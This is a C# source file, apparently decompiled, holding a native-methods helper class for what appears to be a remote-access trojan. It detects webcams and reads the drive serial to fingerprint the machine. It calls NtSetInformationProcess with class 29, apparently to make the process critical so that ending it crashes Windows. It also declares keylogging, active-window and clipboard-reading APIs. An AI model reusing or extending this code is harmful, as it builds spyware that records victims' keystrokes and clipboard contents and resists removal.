using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace XV
{
    internal sealed class Nm
    {
        [DllImport("psapi")]
        internal static extern bool EmptyWorkingSet(long hProcess);

        [DllImport("ntdll")]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass,
            ref int processInformation, int processInformationLength);

        [DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        internal static extern bool capGetDriverDescriptionA(short wDriver,
            [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName,
            [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        private static extern int GetVolumeInformationA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName,
            [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer, int nVolumeNameSize,
            ref int lpVolumeSerialNumber, ref int lpMaximumComponentLength, ref int lpFileSystemFlags,
            [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer, int nFileSystemNameSize);

        [DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        internal static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        internal static extern int GetWindowThreadProcessId(IntPtr hwnd, ref int lpdwProcessID);

        [DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        internal static extern int GetWindowTextA(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle,
            int MaxLength);

        [DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        internal static extern int GetWindowTextLengthA(long hwnd);

        internal static bool Cam()
        {
            checked
            {
                try
                {
                    int num = 0;
                    while (true)
                    {
                        var arg_21_0 = (short) num;
                        string text = Strings.Space(100);
                        int arg_21_2 = 100;
                        string text2 = null;
                        if (capGetDriverDescriptionA(arg_21_0, ref text, arg_21_2, ref text2, 100))
                        {
                            break;
                        }
                        num++;
                        if (num > 4)
                        {
                            goto IL_2C;
                        }
                    }
                    return true;
                    IL_2C:
                    ;
                }
                catch (Exception expr_2E)
                {
                    ProjectData.SetProjectError(expr_2E);
                    ProjectData.ClearProjectError();
                }
                return false;
            }
        }

        internal static string HardDiskSerial()
        {
            string result;
            try
            {
                string text = Interaction.Environ("SystemDrive") + "\\";
                string text2 = null;
                int arg_2F_2 = 0;
                int num = 0;
                int num2 = 0;
                string text3 = null;
                int number = 0;
                GetVolumeInformationA(ref text, ref text2, arg_2F_2, ref number, ref num, ref num2, ref text3, 0);
                result = Conversion.Hex(number);
               
            }
            catch (Exception expr_3E)
            {
                ProjectData.SetProjectError(expr_3E);
                result = "ERR";
                ProjectData.ClearProjectError();
            }
            return result;
        }

        internal static void ShutDow()
        {
            pr(0);
        }

        internal static void pr(int i)
        {
            try
            {
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref i, 4);
            }
            catch (Exception expr_17)
            {
                ProjectData.SetProjectError(expr_17);
                ProjectData.ClearProjectError();
            }
        }

        [DllImport("user32.dll")]
        internal static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [MarshalAs(UnmanagedType.LPWStr)] [Out] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

        [DllImport("user32.dll")]
        internal static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        internal static extern uint MapVirtualKey(uint uCode, uint uMapType);

     //   [DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
       // private static extern int GetWindowThreadProcessId(IntPtr hwnd, ref int lpdwProcessID);

        [DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        internal static extern int GetKeyboardLayout(int dwLayout);

      //  [DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
       // private static extern IntPtr GetForegroundWindow();

        [DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        internal static extern short GetAsyncKeyState(int vKey);

        [DllImport("user32.dll", SetLastError = true)]
        internal static extern IntPtr GetClipboardData(uint uFormat);

        [DllImport("user32.dll", SetLastError = true)]
        internal static extern bool CloseClipboard();

        [DllImport("kernel32.dll")]
        internal static extern UIntPtr GlobalSize(IntPtr hMem);

        [DllImport("kernel32.dll")]
        internal static extern IntPtr GlobalLock(IntPtr hMem);

        [DllImport("user32.dll", SetLastError = true)]
        internal static extern bool OpenClipboard(IntPtr hWndNewOwner);
    }
}